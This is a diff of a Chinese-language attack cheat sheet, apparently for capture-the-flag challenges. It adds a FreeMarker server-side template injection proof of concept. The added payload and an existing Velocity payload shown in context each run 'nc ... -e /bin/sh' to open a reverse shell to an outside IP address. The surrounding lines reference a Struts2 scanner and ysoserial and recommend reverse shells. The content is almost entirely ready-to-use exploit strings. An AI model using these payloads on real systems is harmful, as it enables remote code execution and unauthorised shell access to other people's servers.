@@ -3397,6 +3397,18 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --e
 /ssti?template=#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("nc 144.34.181.239 10008 -e /bin/sh")
 ```
 
+#### freemaker 模板注入
+
+- 注入的时候记得 urlencode
+
+##### poc 举例
+
+`/hello` 是 Web 路径，`name` 是 GET 参数，根据具体的题目不同更改
+
+```bash
+/hello?name=<#assign value="freemarker.template.utility.Execute"?new()>${value("nc 144.34.181.239 10008 -e /bin/sh")}
+```
+
 #### ysoserial
 
 - 推荐使用 shell 反弹，因为靶机中未必有 wget 或 curl，不一定能数据外带
